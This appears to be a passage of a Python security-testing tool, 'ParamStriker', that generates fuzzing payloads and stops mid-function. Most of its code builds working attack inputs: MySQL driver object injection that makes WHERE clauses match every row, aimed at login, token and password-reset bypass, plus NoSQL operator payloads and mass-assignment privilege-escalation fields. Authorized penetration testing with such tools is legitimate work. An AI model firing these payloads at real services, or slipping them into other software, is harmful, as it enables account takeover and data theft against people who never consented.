#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ParamStriker  —  JSON & Query Parameter Fuzzing Framework  v7.0       ║
║   ───────────────────────────────────────────────────────────────────        ║
║   AUTHORIZED TESTING ONLY  ·  OFFLINE PAYLOAD GENERATOR  ·  NO NETWORK I/O   ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   This is a defensive fuzzing toolkit.  It generates test cases.             ║
║   It does NOT send requests, scan targets, exploit systems, or write         ║
║   files anywhere other than the working directory you point it at.           ║
║                                                                              ║
║   Use it only against systems you own or are explicitly authorized to test.  ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   v7 highlights vs. v6                                                       ║
║   ────────────────────                                                       ║
║   • Clean modular architecture (registry + plugin generators)                ║
║   • Unified Payload dataclass with rich metadata (category, mutation,        ║
║     parser targets, expected behavior, possible impact, risk, tags)          ║
║   • PDO Sql generator runs first and was expanded from 10 → 40+ scenarios     ║
║   • NEW: PDO Prepared Statement parser SQLi generator                        ║
║     (Searchlight Cyber / Adam Kues "hashkitten" technique, July 2025)        ║
║   • Per-payload content hashing → fast deduplication                         ║
║   • Multi-format export: jsonl · csv · txt · md · burp · ffuf · postman      ║
║   • Deterministic, seeded; safe-mode disables DoS payloads by default        ║
║   • Full argparse CLI; embedded `--selftest`                                 ║
║                                                                              ║
║   References                                                                 ║
║   ──────────                                                                 ║
║   • Searchlight Cyber, "A Novel Technique for SQL Injection in PDO's        ║
║     Prepared Statements" — Adam Kues, 2025-07-21                             ║
║   • Indigo Shadow, "SQL Injection in PHP PDO Prepared statements",           ║
║     Medium, 2026-01-12                                                       ║
║   • PDO Sql, "MySQL/Node.js Prepared Statement Bypass"                ║
║   • Bishop Fox, "An Exploration of JSON Interoperability Vulnerabilities"   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import argparse
import copy
import csv
import hashlib
import io
import json
import os
import random
import re
import sys
import time
import unicodedata
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import (
    Any, Callable, Dict, Iterable, Iterator, List, Optional,
    Sequence, Set, Tuple, Type, Union,
)


# ════════════════════════════════════════════════════════════════════════════
# 0.  SAFETY / VERSION / LIMITS
# ════════════════════════════════════════════════════════════════════════════

__version__       = "7.0.0"
__schema__        = 7
__banner__        = "ParamStriker"
__authors__       = "Mohnad Alshobaili (X: @Mohnad)"

# Hard safety caps. Generators must respect these.
MAX_NESTING_DEPTH        = 50
MAX_PAYLOAD_BYTES        = 256 * 1024     # 256 KiB per payload string
MAX_PAYLOADS_PER_GEN     = 100_000
DEFAULT_RNG_SEED         = 0xA11FD0       # deterministic by default


SAFETY_NOTICE = (
    "AUTHORIZED TESTING ONLY. This tool is an OFFLINE payload generator. "
    "It NEVER sends network traffic. Use it only against systems you own "
    "or are explicitly authorized to test."
)


# ════════════════════════════════════════════════════════════════════════════
# 1.  ENUMS
# ════════════════════════════════════════════════════════════════════════════

class Risk(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def order(self) -> int:
        return ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"].index(self.value)


class MutationType(str, Enum):
    # Core structural / semantic mutations
    TYPE_CONFUSION       = "type_confusion"
    DUPLICATE_KEY        = "duplicate_key"
    STRUCTURE            = "structure"
    PARSER_DIFFERENTIAL  = "parser_differential"
    ENCODING             = "encoding"
    SERIALIZATION        = "serialization"
    # Driver- / framework-targeted families
    PDO_SQL              = "pdo_sql_mysql_nodejs"
    PDO_PARSER           = "pdo_prepared_stmt"
    NOSQL_OPERATOR       = "nosql_operator"
    ORM_DRIVER           = "orm_driver"
    # Logic / authorization payloads
    MASS_ASSIGNMENT      = "mass_assignment"
    AUTH_BYPASS          = "auth_bypass"
    LOGIC_ABUSE          = "logic_abuse"
    # SQLi / template
    SQLI                 = "sqli"
    TEMPLATE_INJECTION   = "template_injection"
    PROTOTYPE_POLLUTION  = "prototype_pollution"
    # Robustness / DoS
    DOS                  = "dos"
    NORMALIZATION        = "normalization"


class FieldType(str, Enum):
    UNKNOWN    = "unknown"
    NULL       = "null"
    BOOLEAN    = "boolean"
    INTEGER    = "integer"
    FLOAT      = "float"
    STRING     = "string"
    ARRAY      = "array"
    OBJECT     = "object"
    # Semantic refinements
    ID         = "id"
    UUID       = "uuid"
    EMAIL      = "email"
    USERNAME   = "username"
    PASSWORD   = "password"
    TOKEN      = "token"
    ROLE       = "role"
    PRIVILEGE  = "privilege_flag"
    TIMESTAMP  = "timestamp"
    PRICE      = "price"
    URL        = "url"


# ════════════════════════════════════════════════════════════════════════════
# 2.  Payload  — the unified output schema
# ════════════════════════════════════════════════════════════════════════════

@dataclass
class Payload:
    """The single, authoritative output record for every generator in v7."""

    category:           str                            # e.g. "PDO_SQL"
    subcategory:        str                            # e.g. "self_ref_object"
    description:        str                            # human-readable
    field:              str                            # field touched, or "*"
    mutation:           MutationType                   # mutation family
    payload:            str                            # serialized payload string
    expected:           str = ""                       # expected parser behavior
    impact:             str = ""                       # possible impact
    parser_targets:     List[str] = field(default_factory=list)
    backend_targets:    List[str] = field(default_factory=list)
    risk:               Risk = Risk.LOW
    tags:               List[str] = field(default_factory=list)
    field_type:         FieldType = FieldType.UNKNOWN
    generator:          str = ""                       # generator NAME

    # ── helpers ──────────────────────────────────────────────────────────
    def fingerprint(self) -> str:
        """Stable hash used for dedup. Covers payload body + category +
        sub-classification so the same string under a different category is
        kept (different test intent)."""
        h = hashlib.sha1()
        h.update(self.category.encode("utf-8"))
        h.update(b"\x00")
        h.update(self.subcategory.encode("utf-8"))
        h.update(b"\x00")
        h.update(self.payload.encode("utf-8", "surrogatepass"))
        return h.hexdigest()

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["mutation"]   = self.mutation.value
        d["risk"]       = self.risk.value
        d["field_type"] = self.field_type.value
        return d

    def to_jsonl(self) -> str:
        return json.dumps(self.to_dict(), ensure_ascii=False, sort_keys=True)

    def to_csv_row(self) -> List[str]:
        def _safe(s: str) -> str:
            # CSV cannot carry NULL bytes; replace control chars with \xNN escapes.
            out_chars = []
            for c in s:
                o = ord(c)
                if o < 0x20 and c not in ("\t",):
                    out_chars.append(f"\\x{o:02x}")
                else:
                    out_chars.append(c)
            return "".join(out_chars)
        return [
            self.category, self.subcategory, self.field, self.mutation.value,
            self.risk.value, self.field_type.value, self.generator,
            ";".join(self.parser_targets), ";".join(self.backend_targets),
            ";".join(self.tags),
            _safe(self.description), _safe(self.expected), _safe(self.impact),
            _safe(self.payload),
        ]

    @staticmethod
    def csv_header() -> List[str]:
        return [
            "category", "subcategory", "field", "mutation",
            "risk", "field_type", "generator",
            "parser_targets", "backend_targets",
            "tags", "description", "expected", "impact", "payload",
        ]

    def to_burp(self) -> str:
        """Single-line raw payload for Burp Intruder. Embedded CR/LF escaped."""
        return self.payload.replace("\r", "\\r").replace("\n", "\\n")

    def to_ffuf(self) -> str:
        return self.to_burp()


# ════════════════════════════════════════════════════════════════════════════
# 3.  JsonEngine  — deterministic serialization + duplicate-key raw JSON
# ════════════════════════════════════════════════════════════════════════════

class JsonEngine:
    """Low-level JSON helpers. Stateless. Deterministic output."""

    @staticmethod
    def dumps(obj: Any, sort_keys: bool = False) -> str:
        return json.dumps(
            obj,
            ensure_ascii=False,
            separators=(",", ":"),
            sort_keys=sort_keys,
            default=str,
        )

    @staticmethod
    def safe_dumps(obj: Any) -> str:
        """Same as dumps() but catches exotic types (sets, bytes) by stringifying."""
        try:
            return JsonEngine.dumps(obj)
        except (TypeError, ValueError):
            return JsonEngine.dumps(str(obj))

    @staticmethod
    def raw_object_with_duplicates(pairs: Sequence[Tuple[str, Any]]) -> str:
        """Builds a raw JSON object preserving every (key,value) pair in order,
        including duplicate keys. json.dumps cannot do this from a dict, so we
        build the string by hand. Values are serialized normally."""
        parts = []
        for k, v in pairs:
            ks = json.dumps(str(k), ensure_ascii=False)
            vs = JsonEngine.dumps(v)
            parts.append(f"{ks}:{vs}")
        return "{" + ",".join(parts) + "}"

    @staticmethod
    def deep_copy(obj: Any) -> Any:
        return copy.deepcopy(obj)

    @staticmethod
    def replace_field(orig: Dict[str, Any], field_name: str, new_value: Any) -> Dict[str, Any]:
        out = copy.deepcopy(orig)
        out[field_name] = new_value
        return out

    @staticmethod
    def inject_sibling(orig: Dict[str, Any], key: str, value: Any) -> Dict[str, Any]:
        out = copy.deepcopy(orig)
        out[key] = value
        return out


# ════════════════════════════════════════════════════════════════════════════
# 4.  FieldAnalyzer  — smart per-field heuristics
# ════════════════════════════════════════════════════════════════════════════

# Field-name patterns, ordered by specificity.
# NOTE: ID is matched BEFORE USERNAME so `user_id` resolves to ID, not USERNAME.
_FIELD_NAME_PATTERNS: List[Tuple[FieldType, re.Pattern]] = [
    (FieldType.PASSWORD,  re.compile(r"(?i)\b(pass(word)?|pwd|passwd|secret|salt|hash)\b")),
    (FieldType.TOKEN,     re.compile(r"(?i)(token|jwt|api[_-]?key|access[_-]?token|refresh|otp|2fa|mfa|nonce|csrf|xsrf)")),
    (FieldType.EMAIL,     re.compile(r"(?i)(email|mail|e[_-]?mail)")),
    (FieldType.UUID,      re.compile(r"(?i)(uuid|guid)")),
    # ID — matches _id, Id suffix, uid, pk. Placed before USERNAME on purpose.
    (FieldType.ID,        re.compile(r"(?i)(^|_)(id|uid|pk|num|no)($|_)|[a-z]Id$|^id$|^Id$|^ID$")),
    # USERNAME — tight enough that `user_id` / `user_role` do NOT match.
    (FieldType.USERNAME,  re.compile(r"(?i)(^user(name)?$|^login$|^handle$|^nickname$|^account[_-]?name$|^userName$|^user_name$)")),
    (FieldType.ROLE,      re.compile(r"(?i)\b(role|roles|group|scope|tier)\b")),
    (FieldType.PRIVILEGE, re.compile(r"(?i)(is[_-]?admin|admin|superuser|root|privileg|verified|active|approved|enabled)")),
    (FieldType.TIMESTAMP, re.compile(r"(?i)(_at$|_time$|timestamp|created|updated|deleted|expir|valid_until|date|time)")),
    (FieldType.PRICE,     re.compile(r"(?i)(price|amount|cost|fee|total|balance|qty|quantity|count|stock)")),
    (FieldType.URL,       re.compile(r"(?i)(url|uri|href|link|callback|redirect|webhook)")),
]

_UUID_VALUE_RE = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$"
)
_JWT_VALUE_RE = re.compile(r"^[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+$")
_EMAIL_VALUE_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
_URL_VALUE_RE   = re.compile(r"^https?://", re.I)


class FieldAnalyzer:
    """Classifies each field by name + value. Drives context-aware mutations."""

    @staticmethod
    def detect(name: str, value: Any) -> FieldType:
        # 1) Value-typed shortcuts
        if value is None:
            return FieldType.NULL
        if isinstance(value, bool):
            return FieldType.BOOLEAN
        if isinstance(value, list):
            return FieldType.ARRAY
        if isinstance(value, dict):
            return FieldType.OBJECT

        # 2) Name-pattern dispatch
        for ft, rx in _FIELD_NAME_PATTERNS:
            if rx.search(name):
                # numeric ID looks like INT but semantically ID — keep ID
                return ft

        # 3) Value-pattern refinement
        if isinstance(value, str):
            if _UUID_VALUE_RE.match(value):
                return FieldType.UUID
            if _EMAIL_VALUE_RE.match(value):
                return FieldType.EMAIL
            if _JWT_VALUE_RE.match(value):
                return FieldType.TOKEN
            if _URL_VALUE_RE.match(value):
                return FieldType.URL
            return FieldType.STRING
        if isinstance(value, int):
            return FieldType.INTEGER
        if isinstance(value, float):
            return FieldType.FLOAT

        return FieldType.UNKNOWN

    @staticmethod
    def analyze(obj: Dict[str, Any]) -> Dict[str, FieldType]:
        return {k: FieldAnalyzer.detect(k, v) for k, v in obj.items()}

    @staticmethod
    def is_auth_field(name: str) -> bool:
        ft = FieldAnalyzer.detect(name, "")
        return ft in (FieldType.PASSWORD, FieldType.TOKEN, FieldType.USERNAME, FieldType.EMAIL)

    @staticmethod
    def is_privilege_field(name: str) -> bool:
        ft = FieldAnalyzer.detect(name, "")
        return ft in (FieldType.ROLE, FieldType.PRIVILEGE)


# ════════════════════════════════════════════════════════════════════════════
# 5.  CONSTANT TABLES  (externalized payload vocabularies)
# ════════════════════════════════════════════════════════════════════════════

# Common privilege / role / ownership flags to attempt mass-assignment with.
PRIVILEGE_FIELDS: Dict[str, Any] = {
    # Role flags
    "role": "admin", "roles": ["admin"], "user_role": "admin", "userRole": "admin",
    "is_admin": True, "isAdmin": True, "admin": True, "is_root": True, "root": True,
    "is_superuser": True, "superuser": True, "is_staff": True, "staff": True,
    "is_owner": True, "owner": True, "is_moderator": True, "moderator": True,
    # Verification / activation
    "verified": True, "is_verified": True, "isVerified": True,
    "email_verified": True, "emailVerified": True, "phone_verified": True,
    "active": True, "is_active": True, "isActive": True, "enabled": True,
    "approved": True, "is_approved": True, "confirmed": True,
    # Permissions
    "permissions": ["*"], "scope": "admin", "scopes": ["admin", "write", "read"],
    "access_level": "admin", "accessLevel": 9999, "level": 9999, "tier": "premium",
    "plan": "enterprise", "subscription": "premium",
    # Soft-delete / state
    "deleted": False, "is_deleted": False, "isDeleted": False, "deleted_at": None,
    "disabled": False, "blocked": False, "is_blocked": False, "banned": False,
    # Ownership / tenancy
    "owner_id": 1, "ownerId": 1, "user_id": 1, "userId": 1,
    "tenant_id": 1, "tenantId": 1, "org_id": 1, "orgId": 1,
    "organization_id": 1, "company_id": 1, "workspace_id": 1, "team_id": 1,
    # Internal flags often left exposed by mass-assign
    "internal": True, "system": True, "trusted": True, "premium": True,
    "audit_skip": True, "skip_audit": True, "no_audit": True,
}

# Token-shaped field names — used by PDO Sql token-bypass scenarios.
TOKEN_FIELD_NAMES: List[str] = [
    "token", "auth_token", "authToken", "access_token", "accessToken",
    "refresh_token", "refreshToken", "reset_token", "resetToken",
    "password_reset_token", "passwordResetToken", "verification_token",
    "verificationToken", "confirm_token", "confirmToken", "activation_token",
    "activationToken", "invite_token", "inviteToken", "magic_token",
    "magicToken", "magic_link", "magicLink", "link_token", "linkToken",
    "email_token", "emailToken", "signup_token", "signupToken",
    "session_id", "sessionId", "session_token", "sessionToken",
    "api_key", "apiKey", "api_token", "apiToken", "client_secret",
    "clientSecret", "otp", "otp_code", "otpCode", "code", "pin",
    "two_factor_code", "twoFactorCode", "mfa_code", "mfaCode",
    "secret", "key", "csrf_token", "csrfToken", "xsrf_token", "xsrfToken",
    "nonce", "challenge", "state", "jwt", "id_token", "idToken",
]

# ID-shaped field names — used for mass SELECT/UPDATE/DELETE scenarios.
ID_FIELD_NAMES: List[str] = [
    "id", "ID", "Id", "uuid", "guid",
    "user_id", "userId", "uid", "userid",
    "account_id", "accountId", "acct_id",
    "member_id", "memberId", "customer_id", "customerId",
    "record_id", "recordId", "entry_id", "entryId",
    "item_id", "itemId", "order_id", "orderId",
    "product_id", "productId", "resource_id", "resourceId",
    "post_id", "postId", "comment_id", "commentId",
    "doc_id", "docId", "file_id", "fileId",
    "tenant_id", "tenantId", "org_id", "orgId",
    "company_id", "companyId", "workspace_id", "workspaceId",
    "project_id", "projectId", "team_id", "teamId",
]

# Common columns referenced by PDO Sql cross-column attacks.
COMMON_DB_COLUMNS: List[str] = list({
    *ID_FIELD_NAMES,
    *TOKEN_FIELD_NAMES,
    "email", "username", "user_name", "login", "handle", "name",
    "password", "passwd", "pwd", "hash", "password_hash", "salt",
    "role", "roles", "is_admin", "isAdmin", "admin", "permission",
    "permissions", "scope", "level", "tier", "status", "active",
    "enabled", "verified", "approved", "deleted", "is_deleted",
    "deleted_at", "deletedAt", "created_at", "createdAt", "updated_at",
    "expires_at", "expiry", "expire", "expiration",
    "1",  # literal "1" column edge case
})

# SQL keyword keys — driver renders these literally inside backticks.
SQL_KEYWORD_KEYS: List[str] = [
    "OR", "AND", "NOT", "NULL", "TRUE", "FALSE", "XOR",
    "SELECT", "WHERE", "UNION", "FROM", "INTO", "VALUES",
    "1=1", "1)=(1", "OR 1", "OR true", "(SELECT 1)", "ANY",
    "ALL", "EXISTS", "IS", "BETWEEN", "LIKE", "RLIKE",
]

# MongoDB / NoSQL operators.
NOSQL_OPERATORS: Dict[str, Tuple[Any, str]] = {
    "$ne":    (None,           "not-equal-null → matches all"),
    "$gt":    ("",             "greater-than-empty → matches all strings"),
    "$gte":   ("",             "≥-empty → matches all strings"),
    "$lt":    ("￿",       "less-than-MaxChar → matches all strings"),
    "$lte":   ("￿",       "≤-MaxChar → matches all strings"),
    "$in":    ([None, True, 0, 1, "admin", ""], "set inclusion"),
    "$nin":   (["___missing___"], "NOT IN nothing → matches all"),
    "$exists":(True,           "field existence probe"),
    "$regex": (".*",           "regex .* matches everything"),
    "$where": ("1==1",         "JS evaluation"),
    "$expr":  ({"$eq": [1, 1]}, "aggregation-expression true"),
    "$or":    ([{"_id": {"$gt": 0}}], "logical OR"),
    "$and":   ([{"_id": {"$gt": 0}}], "logical AND"),
    "$not":   ({"$eq": "___nonsense___"}, "logical NOT"),
    "$elemMatch": ({"$ne": None}, "array element match"),
    "$type":  ("string",       "type filter probe"),
    "$size":  (0,              "array size probe"),
    "$all":   ([],             "all-of-empty matches all"),
    "$mod":   ([1, 0],         "modulo any"),
    "$text":  ({"$search": "."}, "fulltext search wildcard"),
    "$bit":   ({"any": 1},     "bitwise probe"),
    "$jsonSchema": ({},        "empty schema matches all"),
    "$comment":   ("fuzz",     "comment annotation probe"),
}

# Unicode gadgets.
ZERO_WIDTH = ["​", "‌", "‍", "⁠", "﻿"]
BIDI       = ["‪", "‫", "‬", "‭", "‮", "⁦", "⁧", "⁨", "⁩"]
HOMOGLYPHS = {
    "a": "а",  # Cyrillic a
    "e": "е",  # Cyrillic e
    "o": "о",  # Cyrillic o
    "p": "р",  # Cyrillic p
    "c": "с",  # Cyrillic c
    "x": "х",  # Cyrillic x
    "i": "і",  # Cyrillic i
    "l": "ӏ",  # Cyrillic palochka
    "A": "Α",  # Greek Alpha
    "B": "Β",
    "E": "Ε",
    "H": "Η",
    "O": "Ο",
}


# ════════════════════════════════════════════════════════════════════════════
# 6.  Generator Registry  (plugin architecture)
# ════════════════════════════════════════════════════════════════════════════

@dataclass
class GeneratorContext:
    """Runtime context passed to every generator.

    Generators must be pure functions of (orig, ctx). No I/O. No global state.
    """
    orig:           Dict[str, Any]
    field_types:    Dict[str, FieldType] = field(default_factory=dict)
    safe_mode:      bool = True
    deep_mode:      bool = False
    targeted_fields: Optional[Set[str]]  = None
    rng:            random.Random       = field(default_factory=lambda: random.Random(DEFAULT_RNG_SEED))
    options:        Dict[str, Any]      = field(default_factory=dict)

    def is_targeted(self, field_name: str) -> bool:
        if not self.targeted_fields:
            return True
        return field_name in self.targeted_fields


class BaseGenerator:
    """Subclass + decorate with @register to wire a generator into v7."""

    NAME:      str           = "base"
    CATEGORY:  str           = "BASE"
    ORDER:     int           = 999
    MUTATION:  MutationType  = MutationType.STRUCTURE
    RISK_BIAS: Risk          = Risk.LOW
    DEEP_ONLY: bool          = False   # if True, only run when ctx.deep_mode
    SAFE_GATE: bool          = False   # if True, skipped in ctx.safe_mode

    # ---- helpers subclasses use --------------------------------------------
    def mk(self,
           subcategory: str,
           description: str,
           field_name:  str,
           payload_obj: Any,
           *,
           expected: str = "",
           impact:   str = "",
           parser_targets:  Optional[List[str]] = None,
           backend_targets: Optional[List[str]] = None,
           risk:     Optional[Risk] = None,
           tags:     Optional[List[str]] = None,
           field_type: FieldType = FieldType.UNKNOWN,
           raw_payload_str: Optional[str] = None) -> Optional[Payload]:
        """Build a Payload. If serialization fails or payload exceeds size
        cap, returns None and the caller should skip."""
        if raw_payload_str is not None:
            body = raw_payload_str
        else:
            body = JsonEngine.safe_dumps(payload_obj)
        if len(body.encode("utf-8", "surrogatepass")) > MAX_PAYLOAD_BYTES:
            return None
        return Payload(
            category        = self.CATEGORY,
            subcategory     = subcategory,
            description     = description,
            field           = field_name,
            mutation        = self.MUTATION,
            payload         = body,
            expected        = expected,
            impact          = impact,
            parser_targets  = list(parser_targets or []),
            backend_targets = list(backend_targets or []),
            risk            = risk or self.RISK_BIAS,
            tags            = list(tags or []),
            field_type      = field_type,
            generator       = self.NAME,
        )

    # ---- contract ----------------------------------------------------------
    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        raise NotImplementedError


# Registry — populated by @register at class-definition time.
GENERATOR_REGISTRY: List[Type[BaseGenerator]] = []


def register(cls: Type[BaseGenerator]) -> Type[BaseGenerator]:
    GENERATOR_REGISTRY.append(cls)
    return cls


def sorted_generators() -> List[Type[BaseGenerator]]:
    return sorted(GENERATOR_REGISTRY, key=lambda c: (c.ORDER, c.NAME))


# ════════════════════════════════════════════════════════════════════════════
# 7.  Generators
#
#     ORDER controls the sequence in which payloads appear in output.
#     We give PDO Sql the lowest ORDER on purpose — it leads the file —
#     and the new PDOPreparedStatementGenerator follows immediately.
# ════════════════════════════════════════════════════════════════════════════


# ──────────────────────────────────────────────────────────────────────────
# 7.1  PdoSqlGenerator
#
#      PDO Sql — "MySQL/Node.js Prepared Statement Bypass"
#
#      The mysql / mysql2 NPM drivers (default `stringifyObjects=false`)
#      render JS objects/arrays as raw SQL fragments instead of quoted
#      strings — even when prepared statements are used. The same input
#      shape that makes Express/Sequelize/Knex unsafe is what we exploit
#      here, by emitting structured JSON bodies a real attacker would post.
#
#      v6 had 10 scenarios. v7 ships 40+, covering every realistic API
#      shape: auth, password reset, 2FA, mass select/update/delete,
#      tenant escape, sub-ORM operator confusion, GraphQL variable injection,
#      bulk endpoints, comparison-operator confusion, soft-delete bypass,
#      coupon/discount abuse, ORDER BY / LIMIT injection, etc.
# ──────────────────────────────────────────────────────────────────────────

@register
class PdoSqlGenerator(BaseGenerator):

    NAME      = "pdo_sql"
    CATEGORY  = "PDO_SQL"
    ORDER     = 100             # FIRST — runs before everything else
    MUTATION  = MutationType.PDO_SQL
    RISK_BIAS = Risk.HIGH

    PARSER_TARGETS  = ["mysql", "mysql2", "Sequelize", "Knex", "TypeORM-MySQL"]
    BACKEND_TARGETS = ["Node.js Express + MySQL/MariaDB"]

    # ---- shared payload primitives ----------------------------------------
    _TRUE_VALUES:  List[Tuple[Any, str]] = [
        (1, "int 1"), (True, "bool true"), ("1", "str '1'"), ("true", "str 'true'"),
        (2, "int 2"), (-1, "int -1"), (100, "int 100"), (1.0, "float 1.0"),
        (0.1, "float 0.1"),
    ]
    _FALSE_VALUES: List[Tuple[Any, str]] = [
        (0, "int 0"), (False, "bool false"), (None, "null"),
        ("", "empty string"), ("0", "str '0'"), ("false", "str 'false'"),
    ]

    # ---- entrypoint -------------------------------------------------------
    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        scenarios: List[Callable[[GeneratorContext], Iterator[Payload]]] = [
            self._s01_self_ref_object,
            self._s02_cross_column_object,
            self._s03_array_bypass,
            self._s04_token_bypass,
            self._s05_password_reset,
            self._s06_login_bypass,
            self._s07_two_factor_bypass,
            self._s08_session_confusion,
            self._s09_jwt_field_injection,
            self._s10_api_key_bypass,
            self._s11_mass_select,
            self._s12_mass_update,
            self._s13_mass_delete,
            self._s14_mass_invite,
            self._s15_mass_share,
            self._s16_privilege_escalation,
            self._s17_tenant_escape,
            self._s18_org_escape,
            self._s19_workspace_escape,
            self._s20_chained_bypass,
            self._s21_boolean_coercion,
            self._s22_sql_keyword_keys,
            self._s23_nested_variants,
            self._s24_empty_and_numeric_keys,
            self._s25_multi_key_objects,
            self._s26_soft_delete_bypass,
            self._s27_coupon_abuse,
            self._s28_order_payment_bypass,
            self._s29_filter_listing_bypass,
            self._s30_search_field_bypass,
            self._s31_order_by_injection,
            self._s32_limit_offset_injection,
            self._s33_in_clause_poisoning,
            self._s34_comparison_confusion,
            self._s35_bulk_operations,
            self._s36_graphql_variable_injection,
            self._s37_orm_operator_aware,
            self._s38_prototype_pollution_combo,
            self._s39_mass_assignment_combo,
            self._s40_unicode_field_confusion,
            self._s41_toString_object_bypass,
            self._s42_negative_id_bypass,
            self._s43_uuid_zero_bypass,
            self._s44_expiry_window_bypass,
            self._s45_status_state_bypass,
        ]
        for fn in scenarios:
            yield from fn(ctx)

    # ============= S01 — Self-referencing object (the core attack) =========
    def _s01_self_ref_object(self, ctx: GeneratorContext) -> Iterator[Payload]:
        """
        {"field": {"field": 1}} → WHERE field=`field`=1 → ALL rows matched.

        Driver renders the object as `key`=value. MySQL then evaluates
        col=`col`=1: col compared to itself is 1 (true) for any non-null,
        1=1 is true. Net result: WHERE clause is always satisfied.
        """
        sub = "self_ref_object"
        for f, _v in ctx.orig.items():
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for v, lbl in self._TRUE_VALUES:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: v})
                p = self.mk(sub,
                    f"Self-ref {f}={{{f}:{lbl}}} → WHERE {f}=`{f}`={lbl} → ALL rows",
                    f, obj,
                    expected=f"mysql driver renders `{f}`={lbl}; col=col=1 → true",
                    impact="Mass row matching (auth bypass / IDOR / data exposure)",
                    parser_targets=self.PARSER_TARGETS,
                    backend_targets=self.BACKEND_TARGETS,
                    risk=Risk.CRITICAL if FieldAnalyzer.is_auth_field(f) else Risk.HIGH,
                    tags=["pdo_sql", "self_ref", "all_rows"],
                    field_type=ft)
                if p: yield p
            # FALSE probes — useful to confirm vulnerability via differential
            for v, lbl in self._FALSE_VALUES:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: v})
                p = self.mk(sub,
                    f"FALSE probe {f}={{{f}:{lbl}}} → expects NO rows (diff=vuln)",
                    f, obj,
                    expected=f"WHERE {f}=`{f}`={lbl} → false → no rows",
                    impact="Differential probe: response delta vs TRUE confirms vuln",
                    risk=Risk.INFO, tags=["pdo_sql", "probe"],
                    field_type=ft)
                if p: yield p
            # Doubly-nested
            obj = JsonEngine.replace_field(ctx.orig, f, {f: {f: 1}})
            p = self.mk(sub,
                f"Double-nested self-ref on {f}: {{{f}:{{{f}:1}}}}",
                f, obj,
                expected="Driver may still resolve innermost; serialization quirk",
                risk=Risk.MEDIUM, tags=["pdo_sql", "nested"],
                field_type=ft)
            if p: yield p

    # ============= S02 — Cross-column reference ============================
    def _s02_cross_column_object(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "cross_column"
        cols = [c for c in COMMON_DB_COLUMNS]
        for f in ctx.orig:
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for col in cols:
                if col == f:
                    continue
                for v, lbl in [(1, "1"), (True, "true")]:
                    obj = JsonEngine.replace_field(ctx.orig, f, {col: v})
                    p = self.mk(sub,
                        f"Cross-col {f}={{{col}:{lbl}}} → WHERE {f}=`{col}`={lbl}",
                        f, obj,
                        expected=f"If `{col}` exists in schema, comparison evaluates;"
                                 " response delta exposes schema",
                        impact="Schema enumeration + bypass via any non-zero column",
                        parser_targets=self.PARSER_TARGETS,
                        backend_targets=self.BACKEND_TARGETS,
                        risk=Risk.HIGH if col in {"password","is_admin","admin","role"}
                                          else Risk.MEDIUM,
                        tags=["pdo_sql", "cross_col", "schema_probe"],
                        field_type=ft)
                    if p: yield p

    # ============= S03 — Array bypass ======================================
    def _s03_array_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "array_bypass"
        for f in ctx.orig:
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            variants: List[Tuple[Any, str, str]] = [
                ([f],              f"[{f!r}]",              "driver renders field name"),
                ([f, 1],           f"[{f!r},1]",            "like {field:1}"),
                ([f, True],        f"[{f!r},true]",         "like {field:true}"),
                ([1],              "[1]",                   "single int"),
                ([True],           "[true]",                "single bool"),
                ([0],              "[0]",                   "single zero"),
                ([1, 2, 3],        "[1,2,3]",               "IN-style multi"),
                ([{f: 1}],         f"[{{{f}:1}}]",          "array of self-ref"),
                ([{f: 1}, 1],      f"[{{{f}:1}},1]",        "mixed obj+scalar"),
                ([f, f],           f"[{f!r},{f!r}]",        "field name twice"),
            ]
            for val, repr_, why in variants:
                obj = JsonEngine.replace_field(ctx.orig, f, val)
                p = self.mk(sub,
                    f"Array on {f}={repr_} ({why})",
                    f, obj,
                    expected="mysql driver renders arrays as comma-separated SQL",
                    impact="Same bypass primitive as object form; sometimes evades filters",
                    parser_targets=self.PARSER_TARGETS,
                    backend_targets=self.BACKEND_TARGETS,
                    risk=Risk.HIGH, tags=["pdo_sql", "array"],
                    field_type=ft)
                if p: yield p

    # ============= S04 — Token bypass ======================================
    def _s04_token_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "token_bypass"
        for f, v in ctx.orig.items():
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            looks_token = ft is FieldType.TOKEN or any(
                k in f.lower() for k in ("token", "code", "otp", "key", "secret",
                                         "pin", "auth", "reset", "verify", "confirm",
                                         "session", "csrf", "nonce", "jwt"))
            if not (looks_token or isinstance(v, str)):
                continue
            # Primary: self-ref
            for val, lbl in [(1, "1"), (True, "true")]:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: val})
                p = self.mk(sub,
                    f"[BLOG] Token bypass on {f}={{{f}:{lbl}}}",
                    f, obj,
                    expected="WHERE token=`token`=true → any active token row matches",
                    impact="Auth bypass / account takeover / password reset hijack",
                    parser_targets=self.PARSER_TARGETS,
                    backend_targets=self.BACKEND_TARGETS,
